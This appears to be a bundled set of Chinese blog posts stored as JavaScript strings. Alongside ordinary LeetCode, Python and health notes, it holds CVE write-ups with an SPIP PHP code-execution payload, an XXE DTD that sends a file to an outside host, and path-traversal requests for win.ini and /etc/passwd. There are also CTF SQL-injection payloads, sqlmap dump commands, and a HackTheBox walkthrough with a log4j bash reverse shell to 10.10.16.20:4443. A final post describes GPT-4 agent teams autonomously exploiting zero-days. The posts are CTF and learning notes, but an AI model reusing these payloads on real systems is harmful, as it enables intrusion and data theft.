User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1701181998
Upgrade-Insecure-Requests: 1
\`\`\`

> 注意：执行的命令存在空格用','替换 例如： \`ls -l\`命令改成 \`ls','-l\`
原理一：一旦配置通配符*，访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / “ \\ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。

> 不知道为啥\`/\`无法使用，所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。

最后用的工具

https://github.com/abc123info/Struts2VulsScanTools
`,Rn=`---
title: sum of two numbers
categories:
  - leetcode
  - algorithm
tags:
  - algorithm
---

leetcode 1. 两数之和

# 两数之和

### 题目描述

#### 方法1
    双指针
    时间复杂度O(nlogn)
    空间复杂度O(1)
    代码如下：

\`\`\`python
def twoSum(nums, target):
    nums = [(v, i) for i, v in enumerate(nums)]
    nums.sort()
    left, right = 0, len(nums) - 1
    while left < right:
        if nums[left][0] + nums[right][0] == target:
            return [nums[left][1], nums[right][1]]
        elif nums[left][0] + nums[right][0] < target:
            left += 1
        else:
            right -= 1
    return []
\`\`\`
#### 方法2

    哈希表
    时间复杂度O(n)
    空间复杂度O(n)
    代码如下：

\`\`\`python
def twoSum(nums, target):
    hashmap = {}
    for i, num in enumerate(nums):
        if target - num in hashmap:
            return [hashmap[target - num], i]
        hashmap[num] = i
    return []
\`\`\``,Fn=`---
title: 之前的文章
date: 2024-02-29-13:56:00
categories: [Blogging, Demo]
tags: [test]     # TAG names should always be lowercase
---

# 文章迁移

由于更改模板，之前文章归档于

[old](https://leonooo13.github.io/leonooo13.github.io.old/)  

由于相对路径问题阅读前替换为该地址`,On=`---
title: 车联网安全的一些面试资料
categories: [Blogging]
tags: [ICV]     # TAG names should always be lowercase
---

[微信公众号ICV安全面试](https://mp.weixin.qq.com/s/LRnX_2wLKMWjh-slecpqig)`,Un=`---
title: CVE-2023-27372
categories: [Blogging,CVE]
tags: [CVE]     # TAG names should always be lowercase
---


## CVE-2023-27372
1. 描述

SPIP Cms v4.2.1之前版本允许通过公共区域中的表单值远程执行代码，因为序列化处理不当。

2. 分析

漏洞存在于**密码重置功能**中(漏洞点位\`url：/spip.php?page=spip_pass\`)，重置密码时 \`protege_champ()\`函数没有对序列化字符串进行过滤，从而触发命令执行漏洞。
## FoFa

\`app="SPIP"\`

## 注入点
 注入点位于 输入处

 ![Alt text](</assets/img/Pasted image 20240301200817.png>)

\`args\`参数在检验必须是生成的


\`oubli=s:22:"<?php system('dir');?>"\`

![Alt text](</assets/img/Pasted image 20240301200842.png>)
\`\`\` text
page=spip_pass&formulaire_action=oubli&formulaire_action_args=FE2zn8bKCx%2FVvPGBZIy92xUMWka8Q0Q28cFkYIXxT6BHAyltGN%2FwrwHTdofC9Gp0cejs9ntYLv7I5cq%2F&formulaire_action_sign=&oubli=s:21:"<?php system('ls');?>";&nobot=
\`\`\`
### 总结
SPIP Cms v4.2.1之前版本允许通过公共区域中的表单值远程执行代码，因为序列化处理不当。
利用的话需要先登录，然后在密码重置处进行利用。
s:21:"<?php system('ls');?>"; 为序列化后的字符串
21与\`<?php system('ls');?>\`长度有关

\`\`\`python
s="<?php system('cat /flag');?>"

print(len(s))
\`\`\`
`,Hn=`---
title: CVE-2022-30887
categories: [Blogging,CVE]
tags: [CVE]     # TAG names should always be lowercase
---

## CVE-2022-30887
1. 描述

多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action/editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行

2. 利用
    
    主要是通过信息搜集找到用户名和密码
    然后去上传的地方上传webshell，文件上传没有做任何限制
    ![1709358391366.png](https://img2.imgtp.com/2024/03/02/TDUCP6IS.png)
    `,Bn=`---
title: CVE-2014-3529
categories: [Blogging,CVE]
tags: [cve]     # TAG names should always be lowercase
---

## CVE-2014-3529

必须要公网IP,目标主机可以访问到你的机器给你发送数据

1. 描述

Apache POI 3.10.1 之前的 OPC SAX 设置允许远程攻击者通过 OpenXML 文件读取任意文件，该文件包含与 XML 外部实体 (XXE) 问题相关的 XML 外部实体声明和实体引用。

2. 
![Alt text](../assets/img/PixPin_2024-03-04_16-07-42.png)

![](../assets/img/PixPin_2024-03-04_16-09-49.png)


3. 准备两个资源


\`[Content_Types].xml\` 目标端执行的文件，压缩成zip文件后修改后缀为.xlsx,进行上传

\`\`\`xml 
<!-- [Content_Types].xml -->
<!DOCTYPE ANY [ <!ENTITY % file SYSTEM "file:///flag"> 
<!ENTITY % dtd SYSTEM "http://your public ip/xxe.dtd">
%dtd; %send;]>
\`\`\`



\`xxe.dtd\` 用于\`xml\`里面执行的dtd文件

\`\`\`xml
<!-- xxe.dtd -->
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://your public/%file;'>">
%all;
\`\`\`
4. 执行
![Alt text](../assets/img/2024-3-4.png)

5. 可以返回命令

![](../assets/img/PixPin_2024-03-04_16-43-45.png)


`,Wn=`---
title: CVE-2022-24112
categories: [Blogging, CVE]
tags: [CVE]     # TAG names should always be lowercase
---

## CVE-2022-24112
1. 描述

Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理。 Apache APISIX中存在远程代码执行漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin API的IP限制，容易导致远程代码执行。

2. 利用
    
    通过批处理请求绕过IP限制，进而导致远程代码执行`,$n=`---
title: Some Books for CS
categories: [resource, CS]
tags: [books]
---

## Some Books for CS

一些开源书籍，供大家学习使用。建议支持正版。

![Alt text](https://github.com/lining808/CS-Ebook/raw/main/images/class.svg)

链接：[CS-Ebook](https://github.com/lining808/CS-Ebook)


[Some Books for CS](#some-books-for-cs)

# 计算机基础

| 书名 | 语言 |  封面 |
| --- | --- | --- |
| 计算机组成原理 | 中文 | ![](https://github.com/lining808/CS-Ebook/raw/main/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A6%82%E8%AE%BA/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%20%E5%8D%B71-3.jpg)  |
`,Gn=`---
title: 八股文
categories: [resource, CS]
tags: [Interview]
--- 

# 开一期面试常见问题

## 一、数据结构
## 二、算法
## 三、操作系统
## 四、计算机网络
## 五、数据库
## 六、编程语言

# 一、数据结构
## 1. 数组
## 2. 链表
## 3. 栈
## 4. 队列
## 5. 树
## 6. 图
## 7. 堆
## 8. 哈希表

# 二、算法
## 1. 排序
## 2. 查找
## 3. 递归
## 4. 动态规划
## 5. 贪心
## 6. 回溯
## 7. 分治
## 8. 搜索
## 9. 图论
## 10. 字符串

# 三、操作系统
## 1. 进程
## 2. 线程
## 3. 进程间通信
## 4. 死锁
## 5. 内存管理
## 6. 文件系统
## 7. I/O设备管理
## 8. 调度算法

# 四、计算机网络
## 1. OSI七层模型
## 2. TCP/IP协议族
## 3. IP地址
## 4. ARP协议
## 5. IP协议
## 6. TCP协议
## 7. UDP协议
## 8. HTTP协议
## 9. DNS协议
## 10. 网络安全

# 五、数据库
## 1. 数据库系统
## 2. 数据库设计
## 3. 数据库范式
## 4. 数据库索引
## 5. 事务
## 6. 锁
## 7. ACID
## 8. 数据库优化
## 9. 数据库备份与恢复
## 10. 数据库安全

# 六、编程语言
## 1. C/C++
## 2. Java
## 3. Python
## 4. Go
## 5. JavaScript
## 6. Shell
## 7. SQL
## 8. HTML/CSS
## 9. PHP
## 10. Ruby

# 七、其他
## 1. 设计模式
## 2. 系统设计
## 3. 项目管理
## 4. 代码管理
## 5. 软件测试
## 6. 容器技术
## 7. 微服务
## 8. 云计算
## 9. 大数据
## 10. 人工智能
## 11. 区块链
## 12. 物联网
## 13. 安全
## 14. 算法工程师
## 15. 数据分析
## 16. 数据挖掘
## 17. 机器学习
## 18. 深度学习
## 19. 自然语言处理
## 20. 计算机视觉
## 21. 语音识别
## 22. 推荐系统
## 23. 搜索引擎
## 24. 信息检索
## 25. 信息抽取
## 26. 知识图谱
## 27. 语义网
## 28. 云原生
## 29. DevOps
## 30. 服务器运维

# 八、面试技巧
## 1. 简历
## 2. 面试流程
## 3. 面试技巧
## 4. 面试题解答
## 5. 面试题总结
## 6. 面试题收集
## 7. 面试题整理
## 8. 面试题分类
## 9. 面试题答案
## 10. 面试题解析

`,jn=`---
title: Keep Healthy and Optimisic
date: 2024-03-14
categories: [Body,Health]
tags: [health,optimisic]
---

# Keep Healthy and Optimisic

how to keep healthy and optimisic
\`\`\`
1. Keep a good mood
2. Keep a good diet
3. Keep a good sleep
4. Keep a good exercise
5. Keep a good work
6. Keep a good relationship
7. Keep a good hobby
8. Keep a good learning
9. Keep a good thinking
10. Keep a good life
\`\`\`

body and mind are the most important things in our life, so we should keep them healthy and optimisic.


### wlb
\`\`\`
work-life balance
\`\`\`
### how to go out of the shadow
\`\`\`
1. reduce the pressure
2. keep a good mood
3. keep a good relationship
4. keep a good hobby
\`\`\`

`,Vn=`---
title: 健康运动
date: 2024-03-16
tags:
  - Health
  - life
categories:
  - Health
  - life
description: 健康运动
---

# 健康运动

todo
- [x] 完成1km
- [x] 拉伸运动完成
- [x] 
---
- [x] 如何进行快速搜索


`,Qn=`---
title: 社会中的软技能 # 文章名称
tags: [skills]
categories: [career]
description: 社会中的软技能  # 文章描述
---

# 社会中的软技能
1. 交流能力
   交流能力是非常重要的，减少内耗，不要盲目自我消化，首先查询从互联网上。

2. 解决问题的能力

3. 认识别人的能力。
`,zn=`---
title: Django # 文章名称
tags: [Python,Django]
categories: [Python]
description: Django  # 文章描述
---


### 数据库操作

#### ModelFrom-数据库操作

#### Form 表单操作
`,qn=`---
title: 如何理解python中的异步 # 文章名称
tags: [Code,Python]
categories: [Python]
description: 如何理解python中的异步  # 文章描述
---

## 1. 什么是异步

### 阻塞

    在等待上一个任务完成之前，下一个任务无法开始，这就是阻塞，我需要上一个程序的值或者释放资源，

### 非阻塞

    在等待上一个任务完成之前，下一个任务可以开始，这就是非阻塞，我可以干别的事情，

### 同步

    不同程序单元为了完成某个任务，在执行过程中需靠某种通信方式以协调一致，称这些程序单元是同步执行的。

### 异步

    为完成某个任务，不同程序单元之间过程中无需通信协调，也能完成任务的方式。
    `,Kn=`---
title: isinstancce # 文章名称
tags: [Python,Code]
categories: [Code,Python]
---

\`isinstance\` 是 Python 编程语言中的一个内置函数，它用于检查一个对象是否是指定类或者是该类所定义的类的实例。

具体来说，\`isinstance()\` 函数接受两个参数：第一个参数是需要检查的对象，第二个参数是一个类或者包含多个类的元组。如果第一个参数是第二个参数指定的类或者是从属于这个类的子类，那么 \`isinstance()\` 函数将返回 \`True\`，否则返回 \`False\`。

这个函数在面向对象编程中非常有用，尤其是在需要根据对象的类型来执行不同操作或者在处理继承和多态性时。它可以帮助开发者确保对象具有期望的类型，从而避免类型错误和潜在的运行时异常。

下面是一个简单的使用 \`isinstance\` 函数的例子：

\`\`\`python
class Animal:
    def __init__(self, name):
        self.name = name

class Dog(Animal):
    def __init__(self, name):
        super().__init__(name)

# 创建一个 Dog 类的实例
my_dog = Dog("Buddy")

# 使用 isinstance 检查 my_dog 是否是 Dog 类的实例
is_dog = isinstance(my_dog, Dog)
print(is_dog)  # 输出: True

# 检查 my_dog 是否是 Animal 类的实例
is_animal = isinstance(my_dog, Animal)
print(is_animal)  # 输出: True

# 检查 my_dog 是否是 str 类型的实例
is_str = isinstance(my_dog, str)
print(is_str)  # 输出: False
\`\`\`

在这个例子中，\`my_dog\` 是 \`Dog\` 类的一个实例，而 \`Dog\` 继承自 \`Animal\` 类。因此，\`isinstance(my_dog, Dog)\` 和 \`isinstance(my_dog, Animal)\` 都返回 \`True\`，而 \`isinstance(my_dog, str)\` 返回 \`False\`，因为 \`my_dog\` 不是字符串类型的实例。`,Xn=`---
title: PyCharm食用指南
tags: [Code,PyCharm]
categories: [JetBrains,PyCharm]
---

PyCharm
=======

1. \`shadows build-in name\` 
    避免使用\`python\`内置函数名称`,Jn=`---
title: CVE-28559 # 文章名称
tags: [CVE,Windows,Linux]
categories: [CVE,exploit]
---

CVE-28559
=======
cve-2024-28995

Windows
GET /?InternalDir=/../../../../windows&InternalFile=win.ini HTTP/1.1

linux
GET /?InternalDir=\\..\\..\\..\\..\\etc&InternalFile=passwd HTTP/1.1
~~`,Yn=`---
title: CVE-2024-36991 # 文章名称
tags: [Sec,CVE]
categories: [WebSec,CVE]
---

CVE-2024-36991
=======
# CVE-2024-36991

![alt text](/assets/img/cve1.png)`,Zn=`---
title:  CTFShow Web
tags: [CTF,WebSec]
categories: [WebSec,CTF]
---


没事打打CTF 也是一种乐趣，这里记录一下一些Web方向的题目，以及解题思路。
## SQLMap
在上述命令中，--batch 选项用于自动执行操作而无需手动干预，--level=4 选项增加了测试强度，--tamper=space2comment 选项用于规避防护机制。

命令的基本格式和说明如下：
\`python .\\sqlmap.py -u <目标URL> --batch --level=4 --tamper=space2comment\`
对于你的具体需求，命令如下：

\`python .\\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment\`

该命令会尝试对 https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 进行 SQL 注入测试，并自动处理测试过程中的问题。


执行这条命令可能会涉及以下几步：

识别注入点：确定 URL 参数中是否存在 SQL 注入漏洞。
数据库枚举：如果存在漏洞，尝试枚举数据库中的表和列。
数据提取：从数据库中提取数据。


要使用 SQLMap 查找数据库，你可以使用以下命令来执行数据库枚举操作。假设你已经确认目标存在 SQL 注入漏洞，并且你希望列出数据库、表和列。以下是逐步的 SQLMap 命令和说明：

  
要使用 SQLMap 查找数据库，你可以使用以下命令来执行数据库枚举操作。假设你已经确认目标存在 SQL 注入漏洞，并且你希望列出数据库、表和列。以下是逐步的 SQLMap 命令和说明：

1. **列出所有数据库**：
    
    \`python .\\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment --dbs\`
    
    这个命令会列出目标数据库服务器上所有可用的数据库。
    
2. **列出某个数据库中的所有表**：
    
    假设你从上一步中获取到了数据库的名字，接下来你可以列出该数据库中的所有表。使用以下命令（将 \`<database_name>\` 替换为实际的数据库名称）：
    
    \`python .\\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment -D <database_name> --tables\`
    
3. **列出某个表中的所有列**：
    
    假设你从上一步中获取到了表的名字，接下来你可以列出该表中的所有列。使用以下命令（将 \`<table_name>\` 替换为实际的表名称）：
    
    \`python .\\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment -D <database_name> -T <table_name> --columns\`
    
4. **提取某个表中的数据**：
    
    如果你需要从表中提取数据，可以使用以下命令（将 \`<column_name>\` 替换为实际的列名）：
    
    
    \`python .\\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment -D <database_name> -T <table_name> -C <column_name> --dump\`
    
    这个命令会从指定的表和列中提取数据。`,ne=`---
title:  CTFShow Web9
tags: [CTF,WebSec]
categories: [WebSec,CTF]
---

没事打打CTF 也是一种乐趣，这里记录一下一些Web方向的题目，以及解题思路。

=======

\`\`\`php



<?php
        $flag="";
		$password=$_POST['password'];
		if(strlen($password)>10){
			die("password error");
		}
		$sql="select * from user where username ='admin' and password ='".md5($password,true)."'";
		$result=mysqli_query($con,$sql);
			if(mysqli_num_rows($result)>0){
					while($row=mysqli_fetch_assoc($result)){
						 echo "登陆成功<br>";
						 echo $flag;
					 }
			}
    ?>

\`\`\`

对于函数md5(string,raw) 第二个参数有以下可选项： TRUE - 原始 16 字符二进制格式 FALSE - 默认。32 字符十六进制数 所以只要md5加密后的16进制转化为二进制时有 'or’xxxx，即可构成闭合语句： username ='admin' and password =‘ ’or 'xxxxx' 成功登陆 这里给出两个符合的字符串 ffifdyop 129581926211651571912466741651878684928 但题目有长度限制，所以输入ffifdyop即可获取flag`,ee=`---
title: buuoj-强网杯-2019 # 文章名称
tags: [CTF, buuoj, 强网杯] # 文章标签
categories: [CTF]
---

[强网杯 2019]高明的黑客
=======

## 题目描述

![alt text](../assets/img/image-4.png)


### 有备份？ 

敏感路径泄露

![alt text](../assets/img/image-6.png)

代码居多，应该找到函数的入口，或者看看有没有什么敏感的函数 \`eval\`



`,te=`---
title: CTFShow_web10 # 文章名称
tags: [CTF,Web]
categories: [CTF]
---

玩玩web
===


\`\`\`php

<?php
		$flag="";
        function replaceSpecialChar($strParam){
             $regex = "/(select|from|where|join|sleep|and|\\s|union|,)/i";
             return preg_replace($regex,"",$strParam);
        }
        if (!$con)
        {
            die('Could not connect: ' . mysqli_error());
        }
		if(strlen($username)!=strlen(replaceSpecialChar($username))){
			die("sql inject error");
		}
		if(strlen($password)!=strlen(replaceSpecialChar($password))){
			die("sql inject error");
		}
		$sql="select * from user where username = '$username'";
		$result=mysqli_query($con,$sql);
			if(mysqli_num_rows($result)>0){
					while($row=mysqli_fetch_assoc($result)){
						if($password==$row['password']){
							echo "登陆成功<br>";
							echo $flag;
						}

					 }
			}
    ?>

\`\`\`
## 代码审计

1. 行内注释

2. 虚拟表链接 密码为空


\`\`\`python
user_name = """'username=' or 1=1 group by password with rollup#"""
password = """&password="""

parm = user_name + password
new_str = parm.replace(" ", "/**/")
print(new_str)

\`\`\`
## BurpSuite  

![alt text](../assets/img/image-5.png)`,se=`---
title: hackthebox-GreenHorn
tags:
  - hackthebox
  - Security
categories:
  - hackthebox
password: lidefei
---

hackthebox-GreenHorn
---


## nmap后有端口


![alt text](../assets/img/image-36.png)


进去看看 注册账号

\`http://10.10.11.25:3000/GreenAdmin/GreenHorn\`


![alt text](../assets/img/image-38.png)

## 修改host做映射
pluck 4.7.18 

google password

没有找到


![alt text](../assets/img/image-37.png)

意思时代码审计


![alt text](../assets/img/image-39.png)

![alt text](../assets/img/image-40.png)

![alt text](../assets/img/image-41.png)

目的文件上传


re.php 修改为re.zip
![alt text](../assets/img/image-43.png)
![alt text](../assets/img/image-42.png)


## get shell


![alt text](../assets/img/image-44.png)

## 提权

![alt text](../assets/img/image-45.png)


![alt text](../assets/img/image-46.png)

![alt text](../assets/img/image-47.png)

![alt text](../assets/img/image-48.png)

https://github.com/spipm/Depix.git


图片消除马赛克
![alt text](../assets/img/user.png)

![alt text](../assets/img/image-49.png)

![alt text](../assets/img/image-50.png)

![alt text](../assets/img/image-51.png)`,oe=`---
title: hackthebox_unified解题
tags:
  - Sec
  - Hackthebox
categories:
  - Hackthebox
password: lidefei
---

hackthebox_unified解题思路
---

## 前提条件

宿主机和目标机器需要在同一网段中

1. kali中可以使用
\`\`\`bash
openvpn unified.ovpn
\`\`\`
连接到hackthebox的vpn

2. windows 中可以使用\`openvpn.exe\`
    下载连接 [OPENVPN](https://openvpn.net/client/client-connect-vpn-for-windows/)

    OPENVPN 加代理 速度快一点

    ![alt text](../assets/img/image-10.png)

    在创建配置文件时 需要勾选代理

    ![alt text](../assets/img/image-11.png)


## 题解

### task 7 What port do we need to inspect intercepted traffic for?

![alt text](../assets/img/image-12.png)

常规思路代理抓包

remberme log4j??


本机IP 

![alt text](../assets/img/image-13.png)


尝试让本机IP访问目标机器的ldap服务

request
![alt text](../assets/img/image-14.png)

因为在windows 下进行攻击靶机此处使用 \`windump\`代替\`tcpdump\`

\`\`\`bash
windump -D
windump -i 1
\`\`\`
指定端口
![alt text](../assets/img/image-16.png)

![alt text](../assets/img/image-15.png)

存在log4j漏洞
![alt text](../assets/img/image-17.png)


通过编译ldap服务来利用该漏洞

\`git clone https://github.com/veracode-research/rogue-jndi\`

下载mvn.zip

![alt text](../assets/img/image-18.png)

理论上来说

\`bash -i >&/dev/tcp/10.10.16.20/4443 0>&1\`

\`bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjIwLzQ0NDMgMD4mMQ==}|{base64,-d}|{bash,-i}\`

https://ares-x.com/tools/runtime-exec

![alt text](../assets/img/image-19.png)

\`\`\`bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjIwLzQ0NDMgMD4mMQ==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"
\`\`\`

启动jar

![alt text](../assets/img/image-20.png)

注意看启动了tomcat服务
![alt text](../assets/img/image-23.png)

监听4443端口

![alt text](../assets/img/image-21.png)


buripsuie 重发

![alt text](../assets/img/image-24.png)

**理论上会拿到shell**

![alt text](../assets/img/image-25.png)

![alt text](../assets/img/image-26.png)


### task 8 What port is the MongoDB service running on?

![alt text](../assets/img/image-27.png)

端口 27117

### TASK 9 What is the default database name for UniFi applications?

ace 

google it

### TASK 10

What is the function we use to enumerate users within the database in MongoDB?

\`mongo --port  27117 ace\`

![alt text](../assets/img/image-28.png)


\`db.admin.find()\`

![alt text](../assets/img/image-29.png)

### TASK 11

What is the function we use to update users within the database in MongoDB?

\`db.admin.insert()\`

### TASK 12

What is the password for the root user?


\`\`\`bash
db.admin.insert({ "email" : "pilgrim@localhost.local", "last_site_name" : "default", "name" : "unifi-admin", "time_created" : NumberLong(100019800), "x_shadow" : "$6$s35.XAjj83yh2Ssr$NnS1Br9C1qhLxPSlxCJn9DH0q42DOqPJDx6fXTuA8fbfcTBfwRIT7eBRsyaCU13zlqwrtgNZGV7p4mpQ8yMOc/" })
\`\`\`
![alt text](../assets/img/image-31.png)

![alt text](../assets/img/image-30.png)


\`db.site.find().forEach(printjson);\`


\`db.privilege.insert({ "admin_id" : "66a5d4f9e88a7f30f38ba2e8", "permissions" : [ ], "role" : "admin", "site_id" : "61ce269d46e0fb0012d47ec4" });\`

Submit user flag


![alt text](../assets/img/image-33.png)

![alt text](../assets/img/image-32.png)


Submit root flag

![alt text](../assets/img/image-34.png)


![alt text](../assets/img/image-35.png)

> 不知道为什么,OPENVPN 的UDP协议无法连接,只能使用TCP协议连接,速度慢一点,但是可以连接成功,不知道是不是因为网络问题,还是OPENVPN的问题, 有没有师傅知道的,请告诉我一下,谢谢! `,ae=`---
title: LLM与0day安全 # 文章名称
tags: [Weixin,Security]
categories: [NetSec] # 分类
---

# LLM 代理可以自主利用零日漏洞

基于大型语言模型 （LLM） 的代理能力越来越强，现在可以解决像[解决现实世界的 GitHub 问题](https://swe-agent.com/)一样复杂的任务。随着这些 AI 代理能力的增加，它们用于恶意应用程序（例如网络安全黑客攻击）的潜力也在增加。事实上，我们实验室的研究表明，当给出漏洞的描述（一天设置）时，人工智能代理可以[利用现实世界的漏洞](https://arxiv.org/abs/2404.08144)。但是，这些代理在零日设置中表现不佳，在这种设置中，代理不知道该漏洞。我们的工作留下了一个悬而未决的问题：更复杂的代理是否有可能利用零日漏洞？

在我们的新研究中，我们展示了人工智能代理_团队_可以在事先不知道漏洞的情况下利用零日漏洞。我们开发了一种称为 HPTSA（分层规划和任务特定代理）的多代理技术，该技术将任务分为探索和规划代理、团队经理代理和特定任务专家代理。

我们创建了一个真实世界的、以 Web 为中心的漏洞基准来测试我们的方法。HPTSA 可以破解我们基准测试中**一半以上的**漏洞，而开源漏洞扫描器为 0%，我们以前的代理为 20%（没有 CVE 描述）。我们的结果表明，像[最初的 GPT-4 安全评估](https://cdn.openai.com/papers/gpt-4-system-card.pdf)那样，在聊天机器人设置中测试 LLM 不足以理解 LLM 的能力。

在博客文章的其余部分，我们将介绍我们的技术、基准和评估。阅读[我们的论文](https://arxiv.org/abs/2406.01637)了解更多详情！

# 分层规划和特定于任务的代理

尽管单个 AI 代理非常强大，但它们受到现有 LLM 功能的限制。例如，如果 AI 代理沿着一条路径走（例如，尝试利用 XSS），则代理很难回溯并尝试利用另一个漏洞（例如，CSRF）。此外，正如多镜头学习文献所显示的那样，LLM 在专注于单一任务时表现最好。

为了解决这些问题，我们创建了 HPTSA。HPTSA 包含三类代理：探索/规划代理、团队经理代理和特定于任务的专家代理。

![](https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*ILUsKdf3zReT_AJx)

我们的 HPTSA 代理的架构图。

探索/规划代理探索环境（即网站），以确定在哪些页面上尝试哪些类型的漏洞利用。在确定整体草图后，它会呼叫团队经理代理。团队经理代理负责呼叫我们特定于任务的专家代理。

我们的任务特定代理专注于单一类型的漏洞（例如，仅 XSS）和后备通用 Web 黑客代理。我们设计了带有提示模板的特定任务代理，以专注于特定形式的漏洞，并使其能够以文档的形式访问特定于漏洞的信息。

团队经理选择要运行的特定代理，并从专家代理那里收集和汇总跟踪。然后，它可以使用此信息来通知我们特定于任务的代理的进一步运行。

# 真实世界漏洞的基准

对于我们的基准测试，我们专注于现实世界的 Web 漏洞。在为我们的基准选择漏洞时，我们有几个标准：1） 它们是在 GPT-4 的知识截止日期之后发布的，2） 它们可以通过开源代码复制，以及 3） 它们的严重性中等或更高。

我们根据论文中概述的标准收集了 15 个漏洞。这些漏洞涵盖类型（例如，XSS、SQLi）、严重性（中等到严重）和应用程序类型（例如，从开源票务软件到会计软件）。

漏洞的一个重要区别是漏洞的类别和漏洞的特定实例。例如，[至少自 2011](https://ieeexplore.ieee.org/abstract/document/6120802) 年以来，服务器端请求伪造 （SSRF） 就被称为一类漏洞。然而，2021 年（10 年后）发生的有史以来最大的黑客攻击之一 Microsoft 现在是一家市值数万亿美元的公司，每年[在计算机安全方面投资约 10 亿美元](https://news.microsoft.com/stories/cloud-security/)，它[使用了 SSRF。](https://www.upguard.com/blog/cve-2021-26855)

因此，找到零日漏洞的特定_实例_至关重要。

# HPTSA可以自主利用零日漏洞

为了测试 HPTSA，我们使用 GPT-4 作为基础代理，并将其部署为 6 个特定于任务的专家代理。我们之前的研究表明，开源模型在黑客任务方面表现不佳，因此我们专注于 GPT-4。取而代之的是，我们将 HPTSA 与单个 GPT-4 代理和带有漏洞描述的 GPT-4 代理（0D 代理）进行了比较。我们进一步比较了开源漏洞扫描器 ZAP 和 MetaSploit。

正如我们所展示的，HPTSA 可以利用 15 个漏洞中的 8 个，而 0D 代理的 15 个漏洞中有 11 个。相比之下，单个 GPT-4 代理只能入侵 15 个漏洞中的 3 个。最后，ZAP 和 MetaSploit 都能够利用 15 个漏洞中的 0 个。

![](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*yYCtEKzHU11cJ5Eh_KnSVw.png)

不同代理和开源漏洞扫描器的黑客攻击漏洞成功率。

我们的结果表明，HPTSA能够自主利用零日漏洞进行黑客攻击。

# 个案研究

为了了解我们的代理可以完成的任务类型，我们演练了一个黑客攻击 flusity-CMS 开源软件的案例研究。我们研究了 flusity-CMS 中的两个漏洞：CVE-2024-24524 和 CVE-2024-27757。管理面板中的添加菜单组件容易受到 CSRF 攻击，用户以管理员身份登录的用户可能仅通过单击 HTML 文件就在不知不觉中在 CMS 中创建新菜单 （CVE-2024–24524）。此外，通过 CMS 中的画廊插件创建画廊时，存在 XSS 漏洞 （CVE-2024–27757）。

在此网站上的HPTSA的一个痕迹上，它采取了以下步骤：

1. 主管代理调用了 XSS 代理，其中包含查找 XSS 漏洞的通用说明： - 运行 1：代理使用给定的凭据成功登录。但是，它没有导航到端点以探索潜在的 XSS 攻击，而是停下来并提供了一份可能追踪的途径列表。 - 运行 2：代理使用给定的凭据成功登录并导航 /admin.php。在那里，它去创建一个帖子，在那里它注入了一个 XSS 有效载荷。然后，它保存并将帖子发布到主页，利用了 XSS 漏洞（但不是 CVE 中提到的 XSS 漏洞）。 - 运行 3：代理使用给定的凭据登录并导航到 。在那里，它探索了可用的菜单和设置，并创建了一个带有 XSS 有效载荷的帖子。但是，它还导航到 addOn 菜单，在那里它在库 addOn 中构建了一个 XSS 有效载荷，成功利用了 CVE-2024–27757。\`/admin.php\`\`/admin.php\`
2. 然后，执行称为SQL代理的监督代理，再次带有通用的指令来浏览网站。 - 运行 1：代理尝试在登录页面上进行 SQL 注入攻击，该攻击确实奏效。 - 运行2：Agent尝试对登录页面进行SQL注入攻击，但失败。然后，它使用正确的凭据登录并访问 .它尝试在创建后页面上进行 SQL 注入，但未获得任何结果。 - 运行 3：代理尝试在登录页面上进行 SQL 注入攻击，但失败，然后使用给定的凭据登录。然后，它访问了端点，并在 post 和语言搜索功能中尝试了 SQL 有效负载，但失败了。\`/admin.php\`\`/admin.php\`
